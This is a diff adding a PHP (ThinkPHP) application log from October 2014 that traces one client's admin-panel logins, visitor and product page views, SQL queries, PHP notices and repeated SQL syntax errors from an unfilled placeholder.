@@ -1,0 +1,1790 @@
+[ 2014-10-10 09:31:56 ] 113.73.217.156 /admin.php/Login/startlogin
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001983s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002071s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002389s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002463s ]
+SQL: SHOW COLUMNS FROM `users` [ RunTime:0.008549s ]
+NOTIC: [8] Undefined index:  username D:\enkjhost\mayning1\web\admin\Lib\Action\LoginAction.class.php 第 90 行.
+NOTIC: [8] Undefined index:  password D:\enkjhost\mayning1\web\admin\Lib\Action\LoginAction.class.php 第 91 行.
+NOTIC: [8] Undefined index:  checkcode D:\enkjhost\mayning1\web\admin\Lib\Action\LoginAction.class.php 第 92 行.
+SQL: SELECT * FROM `users` WHERE ( username = '%s'  ) LIMIT 1   [ RunTime:0.000416s ]
+NOTIC: [8] Use of undefined constant res - assumed 'res' D:\enkjhost\mayning1\web\admin\Lib\Action\LoginAction.class.php 第 102 行.
+NOTIC: [8] Undefined variable: str D:\enkjhost\mayning1\web\admin\Lib\Action\UtilAction.class.php 第 56 行.
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.024273s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.024394s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002754s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001908s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.002517s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.002051s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.009491s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.003523s ]
+INFO: [ view_end ] --END-- [ RunTime:0.003614s ]
+
+[ 2014-10-10 09:31:56 ] 113.73.217.156 /admin.php/Login/getCode
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002574s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002687s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001882s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001966s ]
+
+[ 2014-10-10 09:32:07 ] 113.73.217.156 /admin.php/Login/checkCode
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002598s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002709s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001665s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001740s ]
+
+[ 2014-10-10 09:32:08 ] 113.73.217.156 /admin.php/Login/startlogin
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001970s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002055s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001621s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001692s ]
+SQL: SHOW COLUMNS FROM `users` [ RunTime:0.004571s ]
+SQL: SELECT * FROM `users` WHERE ( username = 'admin'  ) LIMIT 1   [ RunTime:0.000259s ]
+NOTIC: [8] Use of undefined constant res - assumed 'res' D:\enkjhost\mayning1\web\admin\Lib\Action\LoginAction.class.php 第 102 行.
+NOTIC: [8] Undefined variable: char D:\enkjhost\mayning1\web\admin\Lib\Action\UtilAction.class.php 第 49 行.
+NOTIC: [8] Undefined variable: str D:\enkjhost\mayning1\web\admin\Lib\Action\UtilAction.class.php 第 54 行.
+SQL: SHOW COLUMNS FROM `logincount` [ RunTime:0.009424s ]
+SQL: INSERT INTO `logincount` (`username`,`logintime`,`loginip`,`notes`) VALUES ('admin','2014-10-10 09:32','113.73.217.156','中国 广东 中山、Windows简体中文系统、Chrome浏览器、') [ RunTime:0.008518s ]
+SQL: UPDATE `users` SET `lastlogin`='2014-10-10 09:32' WHERE ( id=6 ) [ RunTime:0.010124s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.023945s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.024078s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001868s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001824s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.002410s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001975s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.008349s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002249s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002348s ]
+
+[ 2014-10-10 09:32:08 ] 113.73.217.156 /admin.php/Login/loginCount
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002216s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002313s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001590s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001662s ]
+SQL: SHOW COLUMNS FROM `logincount` [ RunTime:0.004476s ]
+SQL: SELECT COUNT(*) AS tp_count FROM `logincount` LIMIT 1   [ RunTime:0.000338s ]
+SQL: SELECT * FROM `logincount` ORDER BY logintime desc LIMIT 0,15   [ RunTime:0.000771s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.019335s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019430s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001443s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001373s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001270s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001475s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005774s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001687s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001761s ]
+
+[ 2014-10-10 09:32:11 ] 113.73.217.156 /admin.php/Login/visterlist
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001987s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002075s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001610s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001683s ]
+SQL: SHOW COLUMNS FROM `visters` [ RunTime:0.004388s ]
+SQL: SELECT COUNT(*) AS tp_count FROM `visters` LIMIT 1   [ RunTime:0.001844s ]
+SQL: SELECT * FROM `visters` ORDER BY ctime desc LIMIT 0,15   [ RunTime:0.012061s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.024502s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.024614s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001901s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001847s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001646s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001965s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007641s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002235s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002331s ]
+
+[ 2014-10-10 09:32:23 ] 113.73.217.156 /admin.php/Login/visterlist/p/2
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002211s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002307s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001790s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001869s ]
+SQL: SHOW COLUMNS FROM `visters` [ RunTime:0.005354s ]
+SQL: SELECT COUNT(*) AS tp_count FROM `visters` LIMIT 1   [ RunTime:0.002047s ]
+SQL: SELECT * FROM `visters` ORDER BY ctime desc LIMIT 15,15   [ RunTime:0.017758s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.023347s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.023465s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001896s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001895s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001677s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001981s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007738s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002285s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002381s ]
+
+[ 2014-10-10 09:32:26 ] 113.73.217.156 /admin.php/Login/visterlist/p/3
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002098s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002184s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001631s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001703s ]
+SQL: SHOW COLUMNS FROM `visters` [ RunTime:0.004407s ]
+SQL: SELECT COUNT(*) AS tp_count FROM `visters` LIMIT 1   [ RunTime:0.001827s ]
+SQL: SELECT * FROM `visters` ORDER BY ctime desc LIMIT 30,15   [ RunTime:0.012391s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.022131s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.022236s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002039s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001903s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001674s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.002054s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007961s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002238s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002336s ]
+
+[ 2014-10-10 09:32:31 ] 113.73.217.156 /admin.php/Login/visterlist/p/4
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002174s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002268s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001785s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001866s ]
+SQL: SHOW COLUMNS FROM `visters` [ RunTime:0.005712s ]
+SQL: SELECT COUNT(*) AS tp_count FROM `visters` LIMIT 1   [ RunTime:0.002072s ]
+SQL: SELECT * FROM `visters` ORDER BY ctime desc LIMIT 45,15   [ RunTime:0.015696s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.023771s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.023886s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001876s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001818s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001619s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001949s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007546s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002214s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002311s ]
+
+[ 2014-10-10 09:32:36 ] 113.73.217.156 /admin.php/Login/visterlist/p/1
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002597s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002706s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002112s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002208s ]
+SQL: SHOW COLUMNS FROM `visters` [ RunTime:0.005765s ]
+SQL: SELECT COUNT(*) AS tp_count FROM `visters` LIMIT 1   [ RunTime:0.002134s ]
+SQL: SELECT * FROM `visters` ORDER BY ctime desc LIMIT 0,15   [ RunTime:0.011932s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.017816s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.017910s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001444s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001410s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001265s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001485s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005814s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001703s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001777s ]
+
+[ 2014-10-10 09:32:51 ] 113.73.217.156 /admin.php/Product/getAllProductList
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002627s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002742s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002138s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002233s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.006332s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.006232s ]
+NOTIC: [8] Undefined index:  name D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 146 行.
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000577s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000585s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 0,10 [ RunTime:0.000677s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.029834s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.029941s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001720s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001561s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001379s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001664s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.006540s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001890s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001969s ]
+
+[ 2014-10-10 09:32:51 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002003s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002088s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001603s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001669s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004899s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000129s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 14:59:53 ] 113.73.217.156 /admin.php/Login/startlogin
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.003947s ]
+INFO: [ route_check ] --END-- [ RunTime:0.004065s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.003131s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.003227s ]
+SQL: SHOW COLUMNS FROM `users` [ RunTime:0.012398s ]
+NOTIC: [8] Undefined index:  username D:\enkjhost\mayning1\web\admin\Lib\Action\LoginAction.class.php 第 90 行.
+NOTIC: [8] Undefined index:  password D:\enkjhost\mayning1\web\admin\Lib\Action\LoginAction.class.php 第 91 行.
+NOTIC: [8] Undefined index:  checkcode D:\enkjhost\mayning1\web\admin\Lib\Action\LoginAction.class.php 第 92 行.
+SQL: SELECT * FROM `users` WHERE ( username = '%s'  ) LIMIT 1   [ RunTime:0.000453s ]
+NOTIC: [8] Use of undefined constant res - assumed 'res' D:\enkjhost\mayning1\web\admin\Lib\Action\LoginAction.class.php 第 102 行.
+NOTIC: [8] Undefined variable: str D:\enkjhost\mayning1\web\admin\Lib\Action\UtilAction.class.php 第 56 行.
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.031570s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.031701s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002761s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.002885s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.002547s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.003059s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.011518s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.003525s ]
+INFO: [ view_end ] --END-- [ RunTime:0.003616s ]
+
+[ 2014-10-10 14:59:53 ] 113.73.217.156 /admin.php/Login/getCode
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002490s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002588s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001591s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001664s ]
+
+[ 2014-10-10 15:00:05 ] 113.73.217.156 /admin.php/Login/checkCode
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002577s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002689s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002434s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002536s ]
+
+[ 2014-10-10 15:00:06 ] 113.73.217.156 /admin.php/Login/startlogin
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002606s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002725s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.002100s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.002196s ]
+SQL: SHOW COLUMNS FROM `users` [ RunTime:0.004457s ]
+SQL: SELECT * FROM `users` WHERE ( username = 'admin'  ) LIMIT 1   [ RunTime:0.000255s ]
+NOTIC: [8] Use of undefined constant res - assumed 'res' D:\enkjhost\mayning1\web\admin\Lib\Action\LoginAction.class.php 第 102 行.
+NOTIC: [8] Undefined variable: char D:\enkjhost\mayning1\web\admin\Lib\Action\UtilAction.class.php 第 49 行.
+NOTIC: [8] Undefined variable: str D:\enkjhost\mayning1\web\admin\Lib\Action\UtilAction.class.php 第 54 行.
+SQL: SHOW COLUMNS FROM `logincount` [ RunTime:0.008895s ]
+SQL: INSERT INTO `logincount` (`username`,`logintime`,`loginip`,`notes`) VALUES ('admin','2014-10-10 15:00','113.73.217.156','中国 广东 中山、Windows简体中文系统、Chrome浏览器、') [ RunTime:0.010386s ]
+SQL: UPDATE `users` SET `lastlogin`='2014-10-10 15:00' WHERE ( id=6 ) [ RunTime:0.008898s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.026456s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.026585s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001822s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001800s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001601s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001918s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007410s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002214s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002310s ]
+
+[ 2014-10-10 15:00:07 ] 113.73.217.156 /admin.php/Login/loginCount
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002040s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002126s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001633s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001709s ]
+SQL: SHOW COLUMNS FROM `logincount` [ RunTime:0.004559s ]
+SQL: SELECT COUNT(*) AS tp_count FROM `logincount` LIMIT 1   [ RunTime:0.000331s ]
+SQL: SELECT * FROM `logincount` ORDER BY logintime desc LIMIT 0,15   [ RunTime:0.000815s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.019573s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.019659s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001469s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001425s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001286s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001541s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005935s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001706s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001780s ]
+
+[ 2014-10-10 15:00:09 ] 113.73.217.156 /admin.php/Login/visterlist
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002017s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002104s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001658s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001732s ]
+SQL: SHOW COLUMNS FROM `visters` [ RunTime:0.004968s ]
+SQL: SELECT COUNT(*) AS tp_count FROM `visters` LIMIT 1   [ RunTime:0.001877s ]
+SQL: SELECT * FROM `visters` ORDER BY ctime desc LIMIT 0,15   [ RunTime:0.013106s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.025430s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.025544s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002036s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001889s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001745s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.002024s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.008032s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002292s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002391s ]
+
+[ 2014-10-10 15:01:45 ] 113.73.217.156 /admin.php/Product/getAllProductList
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001961s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002050s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001583s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001654s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004966s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004584s ]
+NOTIC: [8] Undefined index:  name D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 146 行.
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000422s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000392s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 0,10 [ RunTime:0.000419s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.029313s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.029414s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.002023s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001841s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001617s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001960s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.007710s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.002227s ]
+INFO: [ view_end ] --END-- [ RunTime:0.002319s ]
+
+[ 2014-10-10 15:01:46 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002176s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002273s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001765s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001836s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004814s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000158s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:01:54 ] 113.73.217.156 /admin.php/Product/getAllProductList/p/2?name=
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002106s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002205s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001616s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001690s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004852s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004277s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 ) ORDER BY sorts asc,pid asc  [ RunTime:0.000388s ]
+SQL: select count(a.id) as count from products a left join procate b on a.proid = b.id where 1=1  [ RunTime:0.000367s ]
+SQL: select a.id,a.title,a.ctime,a.imgs,a.sorts,a.enable,a.state,a.proid,b.title as protitle from products a left join procate b on a.proid = b.id where 1=1  order by a.sorts desc limit 10,10 [ RunTime:0.000485s ]
+INFO: [ view_parse ] --START--
+INFO: ParseTemplate Behavior ::run [ RunTime:0.023759s ]
+INFO: [ view_parse ] --END-- [ RunTime:0.023853s ]
+INFO: [ view_filter ] --START--
+INFO: ContentReplace Behavior ::run [ RunTime:0.001548s ]
+INFO: TokenBuild Behavior ::run [ RunTime:0.001402s ]
+INFO: WriteHtmlCache Behavior ::run [ RunTime:0.001231s ]
+INFO: ShowRuntime Behavior ::run [ RunTime:0.001491s ]
+INFO: [ view_filter ] --END-- [ RunTime:0.005866s ]
+INFO: [ view_end ] --START--
+INFO: ShowPageTrace Behavior ::run [ RunTime:0.001701s ]
+INFO: [ view_end ] --END-- [ RunTime:0.001773s ]
+
+[ 2014-10-10 15:01:54 ] 113.73.217.156 /admin.php/Product/selectChildProcate
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.001971s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002057s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001587s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001654s ]
+NOTIC: [8] Undefined index:  id D:\enkjhost\mayning1\web\admin\Lib\Action\ProductAction.class.php 第 253 行.
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.004708s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=%d )  [ RunTime:0.000175s ]
+ERR: 1064:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '%d )' at line 1
+ [ SQL语句 ] : SELECT * FROM `procate` WHERE ( pid=%d ) 
+
+[ 2014-10-10 15:01:59 ] 113.73.217.156 /admin.php/Product/getProductDetail?id=111
+INFO: [ route_check ] --START--
+INFO: CheckRoute Behavior ::run [ RunTime:0.002414s ]
+INFO: [ route_check ] --END-- [ RunTime:0.002511s ]
+INFO: [ app_begin ] --START--
+INFO: ReadHtmlCache Behavior ::run [ RunTime:0.001586s ]
+INFO: [ app_begin ] --END-- [ RunTime:0.001658s ]
+SQL: SHOW COLUMNS FROM `products` [ RunTime:0.004539s ]
+SQL: SHOW COLUMNS FROM `procate` [ RunTime:0.003999s ]
+SQL: SELECT * FROM `products` WHERE ( id=111 ) LIMIT 1   [ RunTime:0.000458s ]
+SQL: SELECT * FROM `procate` WHERE ( pid=0 )  [ RunTime:0.000229s ]
